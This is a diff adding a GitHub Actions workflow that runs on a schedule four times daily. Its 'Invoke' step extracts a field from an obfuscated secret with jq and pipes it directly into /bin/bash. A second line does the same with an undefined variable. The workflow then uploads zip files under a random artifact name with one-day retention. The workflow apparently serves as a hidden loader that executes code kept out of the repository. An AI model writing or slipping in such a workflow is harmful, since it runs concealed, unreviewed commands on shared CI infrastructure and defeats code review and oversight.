@@ -1,0 +1,32 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '55 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Invoke
+        env:
+          abcuv29: ${{ secrets.abcuv29 }}
+        run: |
+          printf '%s' "$abcuv29" | jq -r .gf708 | /bin/bash
+          echo $mmda87539 | jq -r .nye50672 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: uXu9WkQI
+          path: "*.zip"
+          retention-days: 1
